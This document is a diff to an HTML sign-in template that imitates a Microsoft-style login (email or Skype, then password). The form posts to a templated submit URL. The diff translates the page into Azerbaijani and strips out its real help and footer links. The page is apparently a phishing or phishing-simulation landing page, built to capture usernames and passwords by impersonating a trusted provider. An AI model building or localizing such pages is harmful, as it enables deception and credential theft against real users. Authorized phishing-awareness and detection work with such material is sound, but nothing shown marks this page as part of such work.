@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="az">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sign in to your account</title>
+<title>Hesabınıza daxil olun</title>
 <style>
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -44,25 +44,25 @@
 
     <form action="{{.SubmitURL}}" method="post" autocomplete="off" id="f">
       <div id="step1">
-        <h1>Sign in</h1>
-        <input name="username" id="u" type="email" placeholder="Email, phone, or Skype" required autofocus>
+        <h1>Daxil olun</h1>
+        <input name="username" id="u" type="email" placeholder="E-poçt, telefon və ya Skype" required autofocus>
         <p class="info">
-          <a href="#">Can't access your account?</a><br>
-          No account? <a href="#">Create one now</a>
+          Hesabınıza daxil ola bilmirsiniz?<br>
+          Hesabınız yoxdur? İndi yarat
         </p>
-        <div class="row"><button class="btn" type="button" id="next">Next</button></div>
+        <div class="row"><button class="btn" type="button" id="next">İrəli</button></div>
       </div>
 
       <div id="step2" class="hidden">
         <div class="back"><span class="arr" id="arr">←</span><span id="uecho"></span></div>
-        <h1>Enter password</h1>
-        <input name="password" id="p" type="password" placeholder="Password">
-        <p class="info"><a href="#">Forgot your password?</a></p>
-        <div class="row"><button class="btn" type="submit">Sign in</button></div>
+        <h1>Şifrəni daxil edin</h1>
+        <input name="password" id="p" type="password" placeholder="Şifrə">
+        <p class="info">Şifrənizi unutmusunuz?</p>
+        <div class="row"><button class="btn" type="submit">Daxil ol</button></div>
       </div>
     </form>
   </div>
-  <div class="foot"><a href="#">Terms of use</a><a href="#">Privacy and cookies</a><a href="#">···</a></div>
+  <div class="foot">İstifadə şərtləri &nbsp; Məxfilik və çərəzlər</div>
 
   <script>
     var s1=document.getElementById('step1'),s2=document.getElementById('step2'),
